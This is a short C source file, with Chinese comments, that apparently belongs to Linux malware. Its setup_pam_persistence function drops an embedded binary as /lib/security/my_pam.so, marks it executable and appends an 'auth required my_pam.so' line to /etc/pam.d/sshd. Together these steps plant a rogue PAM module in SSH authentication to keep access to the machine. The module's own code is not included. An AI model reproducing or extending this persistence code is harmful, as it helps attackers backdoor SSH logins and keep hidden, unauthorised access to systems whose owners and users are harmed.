#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"
#include "linux_persistence_pam.h"

#ifdef PAM_MOD
void setup_pam_persistence() {
    printf("设置PAM持久化...\n");
    const char* pam_path = "/lib/security/my_pam.so";
    FILE *pam_file = fopen(pam_path, "wb");
    if (pam_file) {
        // 你需要在此处将 PAM 模块写入文件中
        // 由于实际代码不在此处，假设 my_pam_so 是包含 PAM 模块二进制内容的数组
        extern const unsigned char my_pam_so[];
        extern const size_t my_pam_so_size;
        fwrite(my_pam_so, 1, my_pam_so_size, pam_file);
        fclose(pam_file);
        chmod(pam_path, 0755); // 确保模块可执行

        // 在 /etc/pam.d/ 下添加 PAM 配置
        const char* pam_service_path = "/etc/pam.d/sshd";
        FILE *pam_service_file = fopen(pam_service_path, "a");
        if (pam_service_file) {
            fprintf(pam_service_file, "auth required my_pam.so\n");
            fclose(pam_service_file);
            printf("持久化命令已添加到PAM。\n");
        } else {
            perror("无法打开 PAM 服务文件");
        }
    } else {
        perror("无法创建 PAM 模块文件");
    }
}
#endif